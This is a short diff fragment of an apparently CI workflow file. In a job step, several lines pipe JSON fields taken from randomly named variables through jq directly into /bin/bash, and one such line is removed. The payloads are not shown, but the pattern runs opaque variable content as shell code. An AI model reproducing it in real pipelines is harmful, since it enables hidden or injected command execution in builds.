@@ -26,7 +26,6 @@ jobs:
           echo $xbanb2310 | jq -r .ts026 | /bin/bash
           echo $cihvh1851 | jq -r .qctc0894 | /bin/bash
           printf '%s' "$rg762" | jq -r .r8623 | /bin/bash
-          echo $jyvjz52 | jq -r .atdl10157 | /bin/bash
           echo $c872 | jq -r .y5 | /bin/bash
 
       - name: Save artifact
